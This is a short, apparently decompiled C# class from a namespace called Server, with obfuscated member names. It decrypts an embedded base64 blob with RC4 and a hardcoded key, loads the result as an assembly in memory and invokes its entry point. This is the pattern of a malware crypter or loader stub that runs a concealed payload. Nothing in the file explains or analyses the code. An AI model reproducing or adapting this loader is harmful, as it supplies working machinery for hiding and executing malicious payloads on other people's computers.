using System;
using Microsoft.VisualBasic.CompilerServices;

namespace Server;

[StandardModule]
internal sealed class sar
{
	private static byte[] ksa = IBR.RC4Decrypt(Convert.FromBase64String(IBR.ayy), "KeyEncrypt");

	public static object sss(object object_0)
	{
		AppDomain.CurrentDomain.Load(ksa).EntryPoint!.Invoke(null, null);
		object result = default(object);
		return result;
	}
}
